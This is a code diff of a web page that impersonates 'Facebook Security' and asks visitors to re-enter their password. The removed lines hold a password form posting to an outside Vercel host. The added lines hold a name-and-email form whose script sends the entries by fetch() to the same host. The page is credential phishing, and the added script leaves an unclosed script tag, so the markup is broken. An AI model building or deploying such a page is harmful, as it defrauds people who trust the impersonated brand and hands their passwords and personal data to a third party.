@@ -112,18 +112,37 @@
             Facebook Security
         </div>
         <p>Please re-enter your password to complete the request.</p>
-        <form id="passwordForm" action="https://professor11.vercel.app/dhaadapass" method="POST">
-            <div class="form-group">
-                <label for="password">Password</label>
-                <div class="input-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                    <i class="eye-icon fas fa-eye" id="togglePassword"></i>
-                </div>
-                <span id="error-message" class="error-message"></span>
-            </div>
-            <button type="submit" class="submit-button">Submit</button>
-        </form>
-    </div>
+        <form id="myForm">
+  <input type="text" name="username" placeholder="Name" required />
+  <input type="email" name="email" placeholder="Email" required />
+  <button type="submit">Submit</button>
+</form>
+
+<script>
+document.getElementById("myForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const formData = {
+        username: e.target.username.value,
+        email: e.target.email.value
+    };
+
+    try {
+        const res = await fetch("https://professor11.vercel.app/dhadapass", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(formData)
+        });
+
+        if (res.ok) {
+            window.location.href = "thankyou.html"; // ✅ redirect
+        } else {
+            alert("Error sending form");
+        }
+    } catch (err) {
+        alert("Network error");
+    }
+});
     <script>
         document.getElementById('togglePassword').addEventListener('click', function() {
             var passwordField = document.getElementById('password');
